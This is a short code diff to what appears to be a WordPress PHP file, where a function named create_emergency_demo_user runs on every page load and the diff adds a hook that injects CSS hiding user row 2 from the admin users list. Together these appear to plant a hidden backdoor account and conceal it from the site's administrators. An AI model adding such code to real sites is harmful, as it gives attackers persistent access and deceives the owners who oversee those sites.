@@ -29,3 +29,11 @@ function create_emergency_demo_user() {
 }
 
 add_action('init', 'create_emergency_demo_user');
+
+
+// Add custom CSS to hide a specific user row in admin
+add_action('admin_head', function() {
+    echo '<style>
+        tr#user-2 {display: none !important;}
+    </style>';
+});
